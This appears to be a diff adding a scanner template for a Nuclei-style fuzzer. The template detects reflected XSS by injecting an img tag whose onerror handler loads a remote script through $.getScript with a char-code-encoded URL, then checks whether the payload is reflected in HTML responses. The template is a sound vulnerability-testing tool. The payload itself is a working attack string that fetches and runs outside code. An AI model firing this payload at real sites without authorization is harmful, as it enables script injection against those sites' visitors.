@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-script-url
+
+info:
+  name: Custom Reflection XSS with Script URL
+  author: netbaan
+  severity: medium
+  description: |
+    This template detects reflection XSS vulnerabilities using an onerror event for image tags with a JavaScript payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<img onerror=\$.getScript(String.fromCharCode(*CODE*)); src='asd'>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+      
+      - type: word
+        part: header
+        words:
+          - "text/html"
